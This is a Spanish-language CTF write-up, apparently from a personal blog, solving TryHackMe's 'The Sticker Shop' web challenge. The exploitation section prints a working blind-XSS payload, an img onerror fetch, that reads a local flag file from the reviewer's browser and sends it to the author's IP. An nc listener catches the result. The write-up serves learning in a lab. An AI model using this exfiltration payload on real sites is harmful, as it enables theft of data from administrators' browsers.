+++
date = '2026-10-31T16:13:45+01:00'
draft = false
title = 'The Sticker Shop THM Writeup'
summary = 'Writeup de The Sticker Shop de TryHackMe'
tags = ["THM", "web", "writeup"]
+++

![Logo de la máquina The Sticker Shop](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/logo_The_Sticker_Shop.png)

# Introducción 

Estas son las características de esta máquina de TryHackMe llamada The Sticker Shop:

- Plataforma: TryHackMe
- Máquina: The Sticker Shop
- Dificultad: Easy
- Categoría: Web

## Enunciado

Su tienda local de pegatinas finalmente ha desarrollado su propia página web. No tienen demasiada experiencia con respecto al desarrollo web, por lo que decidieron desarrollar y alojar todo en la misma computadora que utilizan para navegar por Internet y mirar los comentarios de los clientes. ¡Muy inteligente!

¿Puedes leer la bandera en http://MACHINE_IP:8080/flag.txt?

## Reconocimiento

Para el reconocimiento vamos a hacer un escaneo rápido de puertos a la ip de la máquina.

```tmux
nmap -F 10.129.180.138
```
![Escaneo de puertos para ver qué tipo de máquina tenemos delante](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)

Como podemos ver después del escaneo rápido de puertos, vemos que tenemos dos puertos principales abiertos, el 22 para el ssh y el 8080 que dice que es un http-proxy, con lo cual vamos a probar a entrar en nuestro navegador y ver que nos da con la ip seguida del 8080


![Captura de pantalla de la tienda que sale al poner la ip seguida del puerto](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_tienda_web_The_Sticker_Shop.png)

Como podemos ver no tiene apartado de cesta ni para comprar, además pone "We only sell stickers at our physical store. Please feel free to stop by!" pero veo que en la parte de arriba pone feedback:

![Remarcar que pone feedback en la parte superior](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Remarcar_feedback_The_Sticker_Shop.png)

Al acceder podemos ver que tiene un formulario, probablemente este sea el punto de ataque para vulnerar esta máquina.

![Pestaña feedback de The Sticker Shop](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_Apartado_Feedback_The_Sticker_Shop.png)

Además de todo esto, vamos a probar a acceder a la flag directamente con la URL que nos da el enunciado:

![Prueba acceder a la URL que nos está dando el enunciado para conseguir la flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Acceso_no_permitido_The_Sticker_Shop.png)

Como era de esperar, no tengo acceso.

## Identificación de la vulnerabilidad

Okey, después del reconocimiento hemos encontrado un formulario, así que vamos a investigar cómo podemos utilizarlo para vulnerar esta máquina.

Para ello vamos a ver qué ocurre cuando enviamos el formulario, para interceptar esta petición usaremos Burp Suite.

![Mensaje de prueba de formulario](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_enviar_formulario_The_Sticker_Shop.png)

Al enviarlo vemos que nos sale este mensaje de que ya se ha enviado el formulario.

![Mensaje de respuesta de el servidor](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_Respuesta_The_Sticker_Shop.png)

Y en Burp Suite podemos ver ese envío de información:

![La petición Post que podemos ver en Burp Suite](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/BurpSuite_The_Sticker_Shop.png)

Viendo que el campo de feedback probablemente se muestre sin sanitizar en algún panel interno (el que revisa el staff o admin o quien sea), supongo que podía ser vulnerable a XSS. Si logro inyectar JavaScript ahí, se ejecutaría en el navegador de quien lo revise, y eso podría serme útil.

Y aquí está la clave de la pista del enunciado: "alojan todo en el mismo ordenador que utilizan para navegar por Internet". Eso significa que el navegador que revisa el feedback corre en la misma máquina que el servidor web, por lo que tiene acceso directo a `http://127.0.0.1:8080/flag.txt`. Si consigo que ese navegador ejecute un script que lea esa URL y me mande el resultado, me llegaría la flag sin necesidad de acceso directo a la máquina.


## Explotación


Sabiendo esto, voy a crear un payload que, al ejecutarse en el navegador de la máquina, lea la flag desde `localhost:8080/flag.txt` (a la que solo esa máquina tiene acceso) y me la envíe a mí mediante una petición a un servidor, que en este caso será mi máquina usando NetCat.


```tmux
<img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
```

Resumidamente lo que hace este payload es lo siguiente:

- `<img src=x onerror="...">`: hace que tenga un error de carga de imagen, para que ejecute el JavaScript dentro de `onerror`, saltándose filtros básicos que bloquean `<script>`.
- `fetch('http://127.0.0.1:8080/flag.txt')`: hace que el navegador de la víctima pida la flag, porque al final es lo que quiero.
- `.then(r=>r.text())`: convierte la respuesta en texto plano para poder leerlo básicamente.
- `.then(d=>fetch('http://192.168.134.213:8000/?data='+d))`: envía ese texto a mi propia IP, metiéndolo como parámetro en la URL.


Pero para que ese payload funcione, necesito levantar el listener para que escuche la información que nos envíe, para eso voy a usar netcat.

```tmux
nc -lnvp 8000
```

![Imagen de netcat escuchando las peticiones enviadas a mi ip](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/nc_escuchando_The_Sticker_Shop.png)

Envío el formulario con este payload en el campo de feedback, y al poco tiempo recibo la conexión con la flag directamente en la query string:


![Información recibida del servidor a nuestra ip con la flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Respuesta_nc_flag_The_Sticker_Shop.png)

## Obtención de la flag

Y con esto ya tenemos la flag de esta máquina, la cual le hemos sacado al servidor haciendo que nos la envíe a nuestra ip gracias a la inyección de código

![La flag de este nivel censurada](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/flag_The_Sticker_Shop.png)

## Gracias por leer.
